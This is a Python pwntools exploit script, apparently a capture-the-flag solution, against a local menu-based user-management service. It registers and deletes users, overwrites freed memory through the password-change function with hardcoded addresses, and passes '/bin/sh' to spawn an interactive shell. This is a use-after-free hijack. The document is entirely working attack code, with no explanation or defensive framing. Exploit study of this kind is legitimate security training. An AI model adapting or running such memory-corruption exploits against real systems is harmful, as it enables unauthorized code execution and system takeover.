#!/usr/bin/env python3

from pwn import *

# SETTINGS
IP = "127.0.0.1"
PORT = 17137

r = remote(IP, PORT)

def reg(name, n_s, password, p_s):
    r.sendlineafter(b"> ", b"2")

    r.sendlineafter(b": ", str(n_s).encode())
    r.sendlineafter(b": ", name)

    r.sendlineafter(b": ", str(p_s).encode())
    r.sendlineafter(b": ", password)

def login(idx, password, eol=False):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b": ", str(idx).encode())
    if eol:
        r.sendafter(b": ", password)
    else:
        r.sendlineafter(b": ", password)

def view():
    r.sendlineafter(b"> ", b"1")

def change_password(p_s, password, eol=False):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b": ", str(p_s).encode())
    if eol:
        r.sendafter(b": ", password)
    else:
        r.sendlineafter(b": ", password)
    
def del_user():
    r.sendlineafter(b"> ", b"3")

def exit_l():
    r.sendlineafter(b"> ", b"4")

# SPLOIT #
reg(b"user", 64, b"a"*48, 64) # idx 0
exit_l()
reg(b"user2", 64, b"a"*48, 64) # idx 1
exit_l()

login(0, b"a"*48)
del_user()

login(1, b"a"*48)
change_password(24, p64(0x402008)*2+p64(0x00000000004012fb), True)
exit_l()

login(0, b"/bin/sh", True)
view()

r.interactive()
